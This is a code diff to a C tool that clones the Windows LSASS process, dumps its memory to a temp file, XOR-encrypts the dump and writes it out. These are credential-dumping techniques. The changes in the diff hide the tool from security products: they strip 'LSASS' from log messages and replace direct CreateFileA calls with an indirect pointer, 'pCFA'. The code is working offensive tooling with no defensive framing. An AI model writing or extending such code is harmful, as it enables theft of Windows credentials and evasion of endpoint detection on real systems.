@@ -60,7 +60,7 @@ HANDLE CloneLsassProcess() {
         return NULL;
     }
 
-    log_success("Successfully cloned LSASS process, handle: 0x%p", hClone);
+    log_success("Successfully cloned process, handle: 0x%p", hClone);
     return hClone;
 }
 
@@ -76,13 +76,13 @@ DWORD GetProcessIdFromHandle(HANDLE hProcess) {
 BOOL DumpAndXorLsass(const char* outPath, const char* key, size_t key_len) {
     HANDLE hClone = CloneLsassProcess();
     if (!hClone) {
-        log_error("Failed to clone LSASS.");
+        log_error("Failed to clone.");
         return FALSE;
     }
 
     DWORD clonedPID = GetProcessId(hClone);
 
-    HANDLE hTempFile = CreateFileA(
+    HANDLE hTempFile = pCFA(
         "C:\\Windows\\Temp\\__tmpdump.dmp",
         GENERIC_READ | GENERIC_WRITE,
         0,
@@ -134,7 +134,7 @@ BOOL DumpAndXorLsass(const char* outPath, const char* key, size_t key_len) {
     free(buffer);
     CloseHandle(hTempFile);
 
-    HANDLE dumpFile = CreateFileA(outPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    HANDLE dumpFile = pCFA(outPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     DWORD bytesWritten;
     WriteFile(dumpFile, encrypted, fileSize, &bytesWritten, NULL);
     CloseHandle(dumpFile);
